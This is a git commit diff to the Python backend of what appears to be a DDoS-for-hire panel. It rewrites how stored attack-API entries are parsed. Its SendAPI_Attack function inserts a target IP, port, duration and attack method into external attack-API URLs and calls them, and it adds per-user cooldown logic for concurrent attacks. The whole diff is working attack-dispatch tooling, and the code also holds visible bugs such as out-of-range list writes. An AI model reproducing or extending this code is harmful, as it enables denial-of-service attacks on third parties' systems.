adcabcbf7585bd4101abde93d64ffacb9c18e108
n4n0 <74839733+DevZerda@users.noreply.github.com>
2021-07-03 13:38:21 -0400

    Update main.py

--- assets/api_attack_system/main.py
+++ assets/api_attack_system/main.py
@@ -67,12 +67,13 @@ class APICrud:
         for api in apis:
             i += 1
             if len(api) > 5:
-                if api.startswith("api_Methods="):
-                    apiiName = apis[i-3].replace("api_Name=", "")
-                    apiURL = apis[i-2].replace("api_URL=", "")
-                    print(f"{api} {apiiName} | {apiURL}\r\n")
-                    if f"|{method}" in api or f"{method}|" in api:
-                        ListOfAPIs += [apiiName, apiURL]
+                if api.startswith(f"api_Name="):
+                    apiiName = api.replace("api_Name=", "")
+                    apiURL = apis[i].replace("api_URL=", "")
+                    apiMethods = apis[i+1].replace("api_Methods=", "")
+                    apiAccess = apis[i+2].replace("api_Access=", "")
+                    if f"|{method}" in apiMethods or f"{method}|" in apiMethods:
+                        ListOfAPIs.append([apiiName, apiURL])
         return ListOfAPIs   
                   
     """
@@ -133,11 +134,15 @@ class APICrud:
                     apiMethods = apis[i+1].replace("api_Methods=", "")
                     apiAccess = apis[i+2].replace("api_Access=", "")
                     apiFunnel = apis[i+3].replace("api_Funnel=", "")
-                    if "|" in apiFunnel:
-                        apiFunnels = apiFunnel.split("|")
-                        for Funnel in apiFunnels:
-                            if Funnel.split(":")[0] == method:
-                                return Funnel.split(":")[1]
+                    try:
+                        if len(apiFunnel) > 3:
+                            if "|" in apiFunnel:
+                                apiFunnels = apiFunnel.split("|")
+                                for Funnel in apiFunnels:
+                                    if Funnel.split(":")[0] == method:
+                                        return Funnel.split(":")[1]
+                    except:
+                        return method
 
         return method
         
@@ -146,34 +151,49 @@ class APIFunc:
     """
     Doc
     Sends attack to APIs based on the method being used
+    here. this is alot to do and im not motivated lmao
     """
     def SendAPI_Attack(ip, port, time, method):
         APIs = APICrud.GetAPIWithMethod(method) ## 2D Array
+        print(APIs)
 
         Response = ""
 
         if len(APIs) > 0:
             for u in APIs:
-                u[1] = u[1].replace("{ip}", f"{ip}")
-                u[1] = u[1].replace("{host}", f"{ip}")
-                u[1] = u[1].replace("{port}", f"{port}")
-                u[1] = u[1].replace("{time}", f"{time}")
+                # try:
+                u[1] = u[1].replace(r"[ip]", f"{ip}")
+                u[1] = u[1].replace(r"[host]", f"{ip}")
+                u[1] = u[1].replace(r"[port]", f"{port}")
+                u[1] = u[1].replace(r"[time]", f"{time}")
                 lol = APICrud.fixFunneledMethods(u[0], method)
-                u[1] = u[1].replace("{method}", lol)
+                u[1] = u[1].replace(r"[method]", lol)
+                print(u[1])
                 output = requests.get(f"{u[1]}").text
-                print(output) ## debug
+                try:
+                    print(output) ## debug
+                except:
+                    print("failed")
                 Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {u[0]}\r\n"
+                # except:
+                #     Response += f"[x] Error, Failed to send to {u}\r\n"
         else:
-            APIs[1] = APIs[1].replace("{ip}", f"{ip}")
-            APIs[1] = APIs[1].replace("{host}", f"{ip}")
-            APIs[1] = APIs[1].replace("{port}", f"{port}")
-            APIs[1] = APIs[1].replace("{time}", f"{time}")
+            # try:
+            APIs[1] = APIs[1].replace(r"[ip]", f"{ip}")
+            APIs[1] = APIs[1].replace(r"[host]", f"{ip}")
+            APIs[1] = APIs[1].replace(r"[port]", f"{port}")
+            APIs[1] = APIs[1].replace(r"[time]", f"{time}")
             lol = APICrud.fixFunneledMethods(APIs[0], method)
-            APIs[1] = APIs[1].replace("{method}", lol)
+            APIs[1] = APIs[1].replace(r"[method]", lol)
             print(f"Line 174: {APIs[1]}")
             output = requests.get(f"{APIs[1]}").text
-            print(output) ## debug
+            try:
+                print(output) ## debug
+            except:
+                print("failed")
             Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {APIs[0]}\r\n"
+            # except:
+            #     Response += f"[x] Error, Failed to send to {APIs}\r\n"
 
         return Response
 
@@ -181,8 +201,29 @@ class APIFunc:
     Cooldown and Timer Countdown for attack to down 1 concurrent via db
     """
 
-    def NewAttack():
-        #This will go in a new thread
-        # code a nrew function for it
+    def NewAttack(socket, AttackTime):
+        # call code to up 1 concurrent for user here
+        CurrUser = ""
+
+        for user in ServerConfig.clients:
+            if user[1] == socket:
+                CurrUser == user[0]
+                userArr = len(user) 
+                user[userArr] = False
+    
+        for _ in range(0, int(Strings.Cooldown)):
+            time.sleep(1)
+
         
-        pass
+        for user in ServerConfig.clients:
+            if user[1] == socket:
+                userArr = len(user)
+                if CrudFunctions.AttackValidation(user[0]):
+                    user[userArr] = True
+                else:
+                    user[userArr] = False
+
+        for _ in range(0, int(AttackTime-Strings.Cooldown)):
+            time.sleep(1)
+
+        # call function here to down one concurrent or hard code it here
